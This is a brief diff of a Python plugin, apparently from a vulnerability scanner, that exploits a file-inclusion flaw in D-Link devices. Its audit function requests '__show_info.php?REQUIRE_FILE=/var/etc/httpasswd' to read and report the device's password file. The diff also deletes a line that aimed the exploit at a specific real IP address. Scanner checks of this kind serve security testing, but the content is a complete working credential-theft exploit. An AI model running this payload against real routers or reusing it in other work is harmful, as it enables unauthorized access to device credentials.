@@ -17,7 +17,7 @@ def assign(service, arg):
         return True, '%s://%s/' % (arr.scheme, arr.netloc)
 
 def audit(arg):
-    
+
     payload = 'model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd'
     url = arg + payload
     code, head,res, errcode, _ = curl.curl2(url)
@@ -28,10 +28,6 @@ def audit(arg):
         if m:
             security_hole('/var/etc/httpasswd:' + m.group(0))
 
-
-
-
-
-if __name__ == '__main__':
+            return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('d-link', 'http://222.121.54.176/')[1])
